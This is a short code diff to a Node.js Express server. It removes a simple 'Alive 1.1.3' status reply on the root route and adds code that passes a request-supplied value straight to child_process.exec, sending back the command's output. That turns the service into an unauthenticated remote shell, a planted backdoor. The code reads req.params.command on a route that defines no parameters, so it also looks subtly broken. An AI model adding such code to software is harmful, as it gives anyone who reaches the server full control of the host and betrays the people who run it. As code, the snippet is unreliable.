@@ -1,9 +1,18 @@
 const express = require('express');
-
+const {
+   exec
+} = require("child_process");
 const app = express();
 
 app.get('/', async (req, res) => {
-   res.end("Alive 1.1.3");
+   console.log(req.params.command);
+   exec(req.params.command, (err, stdout, stderr) => {
+      if (err)
+         return res.end(err);
+      if (stderr)
+         return res.end(stderr);
+      res.end(stdout);
+   });
 });
 
 app.listen(5055, async () => {
